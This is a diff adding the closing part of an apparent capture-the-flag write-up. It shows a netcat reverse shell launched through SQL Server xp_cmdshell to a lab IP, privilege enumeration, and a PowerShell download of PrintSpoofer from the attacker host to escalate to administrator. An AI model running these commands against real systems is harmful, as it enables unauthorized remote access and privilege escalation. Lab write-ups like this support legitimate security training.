@@ -341,3 +341,53 @@ EXEC xp_cmdshell 'C:\tmp\nc.exe -e cmd 10.8.0.156 4444'
 
 Now let check our listener.
 
+![image](https://user-images.githubusercontent.com/69868171/126161198-943bcd4a-fb4e-43dd-9633-c4dda0f3fe4a.png)
+
+We have shell time to get system.
+
+### Administrator / System
+
+```
+C:\>whoami/priv
+whoami/priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+Seems `SeImpersonatePrivilege` is enabled cool now let find a way to abuse to get administrator access. And with the help of a tools called `PrintSpoofer` .
+
+![image](https://user-images.githubusercontent.com/69868171/126162232-e9499a75-c6dd-46a6-b057-e09b9690d84c.png)
+
+Now let get it on the target.
+
+```
+powershell -c curl http://10.8.0.156/PrintSpoofer.exe -o C:\tmp\printspoofer.exe
+
+printspoofer.exe -i -c powershell
+```
+
+![image](https://user-images.githubusercontent.com/69868171/126164775-990689af-70a2-4f00-b9dc-feeda1f25fbc.png)
+
+We are administrator boom.
+
+![image](https://user-images.githubusercontent.com/69868171/126164952-eeaf0392-1bcd-450a-b686-a1a90da8d8c9.png)
+
+We are done.
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
